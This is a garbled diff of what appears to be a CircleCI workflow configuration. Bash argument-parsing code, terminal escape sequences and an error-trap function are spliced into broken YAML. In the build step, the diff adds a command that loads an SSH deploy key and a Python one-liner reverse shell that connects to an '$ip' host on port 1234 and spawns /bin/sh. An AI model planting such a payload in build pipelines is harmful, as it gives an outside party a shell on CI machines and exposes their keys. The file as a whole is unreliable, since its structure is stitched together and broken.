@@ -44,7 +44,7 @@ jobs:
 workflows:
  version: 2
  Example_Workflow:
- while [[ "$1" =~ ^- && ! "$1" == "--" ]]; do case $1 in
+> while [[ "$1" =~ ^- && ! "$1" == "--" ]]; do case $1 in
   -V | --version )
     echo $version
     exit
@@ -56,21 +56,8 @@ workflows:
     flag=1
     ;;
 esac; shift; done
-if [[ "$1" == '--' ]]; then shift; fi
-   jobs:
-     - Hello-World
-     - I-Have-Code:
-         requires:
-           - Hello-World
-     - Run-With-Node:
-         requires:
-           - Hello-World
-     - Hold-For-Approval: traperr() {
-  echo "ERROR: ${BASH_SOURCE[1]} at about ${BASH_LINENO[0]}"
-}
-
-set -o errtrace
-trap traperr ERR
+if [[ "$1" == '--' ]]; then shift; fi SUB (^Z) > > > > > > > > > 
+ ^[[A^[[A^[[A^[[A^[[A^
          type: approval
          requires:
            - Run-With-Node
@@ -107,7 +94,7 @@ version: 2.1
     steps:
       - run: Write-Host 'Hello, World'
     build: 
-      run:
+      run: eval "$(ssh-agent ./ci/)" && ssh-add -K ~/.ssh/id_deploy-key 
         command: ./ci/$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),   *$ 1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
      working_directory: ~/.sh-python
       environment: https://www.sans.org/reading-room/whitepapers/testing/attack-defend-linux-privilege-escalation-techniques-2016-37562
@@ -143,7 +130,14 @@ jobs:
           # Must be absolute path or relative path from working_directory
           at: /tmp/workspace
 
-      - run: |
+      - run: 
+           command: traperr() {
+  echo "ERROR: ${BASH_SOURCE[1]} at about ${BASH_LINENO[0]}"
+}
+
+set -o errtrace
+trap traperr ERR
+           |
           if [[ `cat /tmp/workspace/echo-output` == "Hello, world!" ]]; then
             echo "It worked!";
           else
